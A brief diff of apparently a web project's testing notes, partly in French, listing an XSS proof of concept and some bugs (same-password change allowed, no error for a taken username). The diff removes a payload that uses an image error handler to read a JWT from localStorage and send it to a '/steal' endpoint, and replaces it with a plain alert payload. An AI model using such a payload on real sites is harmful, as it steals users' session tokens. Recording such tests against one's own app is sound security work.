@@ -9,4 +9,12 @@ checkmark of we ve done according to the subject
 
 
 PoC XSS
-"><img src=x onerror="fetch('http://localhost:8080/steal?jwt='+encodeURIComponent(localStorage.getItem('token')))"><div class="
+"><img src=x onerror=alert('XSS')><div class="
+
+
+
+Possible de changer son mdp avec le meme mdp
+
+Pas de message qand on veut modifier son username par un username déjà pris
+
+Online status 
